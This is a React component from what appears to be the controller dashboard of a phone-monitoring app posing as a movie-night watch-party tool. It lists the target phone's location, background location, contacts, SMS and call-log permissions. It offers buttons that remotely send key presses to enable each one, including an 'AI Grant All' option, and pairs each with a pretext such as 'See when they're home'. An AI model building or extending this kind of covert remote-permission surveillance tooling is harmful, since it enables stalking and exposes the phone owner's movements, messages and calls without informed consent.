import type { DevicePermissions } from "../types/device";
import { PermissionNudge } from "./PermissionNudge";

interface Props {
  perms: DevicePermissions | undefined;
  onGrantAll: () => void;
  onContinueSetup: () => void;
  onRequestPermission: (step: string) => void;
  canSendKeys: boolean;
  loading?: boolean;
}

const ITEMS: { key: keyof DevicePermissions; label: string; step: string; nudge: string }[] = [
  { key: "location", label: "Location", step: "location", nudge: "See when they're home for movie night." },
  { key: "background_location", label: "Background location", step: "background_location", nudge: "Keep sync alive during long movies." },
  { key: "contacts", label: "Contacts", step: "contacts", nudge: "Invite friends in one tap." },
  { key: "sms", label: "SMS", step: "sms", nudge: "Catch watch-party invites from texts." },
  { key: "call_log", label: "Call log", step: "calls", nudge: "See calls during movie night." },
];

export function PermissionsPanel({
  perms,
  onGrantAll,
  onContinueSetup,
  onRequestPermission,
  canSendKeys,
  loading,
}: Props) {
  const missing = ITEMS.filter((i) => perms && perms[i.key] === false);
  const granted = ITEMS.filter((i) => perms && perms[i.key] === true);

  return (
    <section className="permissions-panel glass-panel">
      <div className="permissions-head">
        <p className="panel-title">Permissions</p>
        {missing.length > 0 && canSendKeys && (
          <button type="button" className="permissions-fix-btn" onClick={onContinueSetup}>
            Continue setup
          </button>
        )}
      </div>
      {!perms ? (
        <p className="permissions-empty">{loading ? "Connecting to phone…" : "Waiting for phone status…"}</p>
      ) : (
        <ul className="permissions-list">
          {ITEMS.map(({ key, label, step, nudge }) => {
            const ok = perms[key];
            if (ok === undefined) return null;
            return (
              <li key={key} className={`perm-row ${ok ? "perm-ok" : "perm-miss"}`}>
                <span className="perm-dot" aria-hidden />
                <div className="perm-row-body">
                  <span>{label}</span>
                  {!ok && canSendKeys && (
                    <button
                      type="button"
                      className="perm-row-enable"
                      onClick={() => onRequestPermission(step)}
                    >
                      Enable
                    </button>
                  )}
                  {!ok && <span className="perm-row-hint">{nudge}</span>}
                </div>
                <span className="perm-status">{ok ? "ON" : "OFF"}</span>
              </li>
            );
          })}
        </ul>
      )}
      {missing.length > 0 && canSendKeys && (
        <button type="button" className="permissions-grant-all-link" onClick={onGrantAll}>
          Or use AI Grant All
        </button>
      )}
      {granted.length === ITEMS.filter((i) => perms?.[i.key] !== undefined).length && perms && (
        <p className="permissions-all-ok">All permissions enabled</p>
      )}
    </section>
  );
}
